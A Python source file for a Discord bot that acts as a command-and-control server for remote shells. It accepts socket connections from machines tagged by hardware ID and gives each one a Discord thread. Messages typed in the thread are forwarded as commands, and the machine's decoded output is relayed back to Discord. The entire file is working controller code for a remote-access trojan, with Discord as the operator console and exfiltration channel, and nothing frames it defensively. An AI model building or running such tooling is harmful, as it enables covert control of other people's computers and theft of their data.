import disnake
from disnake.ext import commands
import socket, threading, asyncio, time, base64, os, json
from dotenv import load_dotenv

load_dotenv()

try:
    with open("data/machines.json", "r") as file:
        machines_data = json.loads(file.read())
except:
    machines_data = {}
    with open("data/machines.json", "w") as file:
        file.write("{\n}")

TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_ID = int(os.getenv("CHANNEL_ID"))

HOST = os.getenv("HOST")
PORT = int(os.getenv("PORT"))

default_hwid = "########-####-####-####-############"

bot = commands.Bot(command_prefix="!", intents=disnake.Intents.all())

clients = {}

def set_hwid(hwid: str, data: list):
    global machines_data
    machines_data[hwid] = data
    with open("data/machines.json", "w") as file:
        file.write(json.dumps(machines_data, indent=4))

def send_to_discord_in_code_blocks(bot, thread, text, max_len=1536):
    """
    Sends text in multiple code-block messages so each message is <= 2000 chars.
    Preserves line boundaries.
    """
    lines = text.split('\n')

    # We'll accumulate lines in `message_buffer` until adding another line
    # would exceed (max_len - 6) for the "``` ... ```" wrapper.
    message_buffer = ""
    for i, line in enumerate(lines):
        # +1 for the newline that we'll add when joining
        if len(message_buffer) + len(line) + 1 > (max_len - 6):
            # send the current buffer
            future = asyncio.run_coroutine_threadsafe(
                thread.send(f"```\n{message_buffer}\n```"),
                bot.loop
            )
            while not future.done():
                time.sleep(0.01)

            # start a new buffer
            message_buffer = line
        else:
            # either append with a newline if we're not empty, or just set
            if message_buffer:
                message_buffer += "\n" + line
            else:
                message_buffer = line

    # Send any leftover lines
    if message_buffer:
        future = asyncio.run_coroutine_threadsafe(
            thread.send(f"```\n{message_buffer}\n```"),
            bot.loop
        )
        while not future.done():
            time.sleep(0.01)

def handle_client(channel: disnake.TextChannel, client: tuple[socket.socket, tuple[str, int]]):
    global clients
    client_sock, client_addr = client

    # Create the thread if hwid isnt already known, Else use the old thread if it still exists

    client_data = json.loads(client_sock.recv(2048))

    HWID = client_data.get("HWID", default_hwid)

    stored_data = machines_data.get(HWID, None)

    if stored_data:
        thread = bot.get_channel(stored_data[0])
        asyncio.run_coroutine_threadsafe(thread.edit(name=f"{client_addr[0]}:{HWID} - 🟢"), bot.loop)

        asyncio.run_coroutine_threadsafe(thread.send(f"`[+] Client is online again!`"), bot.loop)
    else:
        future = asyncio.run_coroutine_threadsafe(channel.send(f"`[+] New connection from {client_addr[0]}:{HWID}`"), bot.loop)
        while not future.done():
            future.exception()
            time.sleep(0.01) # Wait until the future is done!
        message = future.result()

        future = asyncio.run_coroutine_threadsafe(message.create_thread(name=f"{client_addr[0]}:{HWID} - 🟢"), bot.loop)

        while not future.done():
            time.sleep(0.01) # Wait until the future is done!
        thread = future.result()
        del future

        set_hwid(HWID, [thread.id])

    thread: disnake.Thread

    # Register this client in the "clients" map
    clients[thread.id] = (client_sock, client_addr, thread)

    while True:
        try:
            # 1) Read a chunk from the socket
            data = client_sock.recv(1024*1024)
            if not data:
                # An empty read means the client closed or lost connection
                raise ConnectionResetError

            # 2) Base64-decode the chunk
            #    (Assumes the client sends each command's output fully in one chunk)
            decoded_text = base64.b64decode(data).decode("utf-8", errors="replace")

            # 3) Send to Discord, preserving lines in code blocks
            send_to_discord_in_code_blocks(bot, thread, decoded_text)

            del decoded_text, data

        except (ConnectionResetError, BrokenPipeError):
            
            print(f"[-] Lost connection from {client_addr[0]}:{client_addr[1]}")
            del clients[thread.id]

            asyncio.run_coroutine_threadsafe(thread.send("`[-] Client went offline ):`"), bot.loop)

            while True:
                future = asyncio.run_coroutine_threadsafe(thread.edit(name=f"{client_addr[0]}:{HWID} - 🔴"), bot.loop)
                try:
                    while not future.done():
                        future.exception(timeout=5)
                        time.sleep(0.01)
                except:
                    continue
                break

            break
        except Exception as e:
            # If something else goes wrong, you can log or handle it
            print(f"[!] Error receiving from {client_addr}: {e}")
            break          

def initialize_socket(channel):
    global clients

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((HOST, PORT))
    server_sock.listen()

    print(f"[+] Started listening on: {HOST}:{PORT}")

    while True:
        client_sock, addr = server_sock.accept()

        print(f"[+] New connection from {addr[0]}:{addr[1]}")

        thread = threading.Thread(target=handle_client, args=(channel, (client_sock, addr), ))
        thread.start()



@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    
    channel = bot.get_channel(CHANNEL_ID)
    if channel is None:
        print("Could not find channel by that ID. Check permissions or the ID itself.")
        return
    
    thread = threading.Thread(target=initialize_socket, args=(channel, ))
    thread.start()
    

@bot.event
async def on_message(message):
    """Handles incoming messages from Discord threads."""
    if message.author.bot:
        return  # Ignore bot messages

    if message.channel.id in clients:  # Check if this thread is linked to a client
        client_sock, client_addr, thread = clients[message.channel.id]
        
        try:
            client_sock.send(message.content.encode("utf-8"))
        except Exception as e:
            print(f"[-] Failed to send message to client. Removing thread {message.channel.id}; Error: {e}")
            del clients[message.channel.id]  # Cleanup on failure
            await thread.edit(name=f"{client_addr[0]}:{client_addr[1]} - 🔴")
            

bot.run(TOKEN)
